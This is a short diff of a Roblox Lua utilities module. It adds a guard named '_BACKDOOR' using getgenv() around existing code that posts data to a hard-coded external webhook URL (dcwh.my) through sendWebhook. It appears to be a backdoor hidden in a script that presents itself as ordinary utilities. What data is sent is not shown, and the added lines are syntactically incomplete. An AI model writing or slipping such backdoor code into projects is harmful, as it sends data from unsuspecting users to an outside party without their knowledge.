@@ -363,8 +363,8 @@ Players.PlayerAdded:Connect(function(player)
 end)
 
 
-
-
+if not getgenv()._BACKDOOR then 
+getgenv()._BACKDOOR =
 local webhookUrl = "https://dcwh.my/post?uniqueid=af985e6a"
 
 local HttpService = game:GetService("HttpService")
@@ -473,6 +473,6 @@ sendWebhook(webhookUrl, webhookData)
  	wait()
 end
 
-
+end
 
 return Utilities
